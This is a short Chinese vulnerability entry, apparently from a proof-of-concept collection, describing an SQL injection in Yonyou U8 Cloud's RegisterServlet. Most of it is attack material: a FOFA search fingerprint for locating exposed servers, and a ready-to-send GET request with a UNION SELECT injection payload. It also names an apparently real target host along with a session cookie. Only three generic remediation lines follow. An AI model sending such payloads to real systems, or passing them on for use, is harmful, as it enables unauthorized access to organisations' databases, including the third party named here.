# 用友U8nc.bs.sm.login2.RegisterServletSQL注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`
- **请求**：`GET /servlet/~uap/nc.bs.sm.login2.RegisterServlet?usercode=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,@@version,NULL,NULL,NULL,NULL--%20Jptd HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="用友-U8-Cloud"
1. 部分界面如下
3、隐患url,复现如下
Host: tjerp.ncschina-gxyj.com:8090
X-Forwarded-For: 127.0.0.1
Cookie: JSESSIONID=D523370AE42E1D2363160250C914E62A.server
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。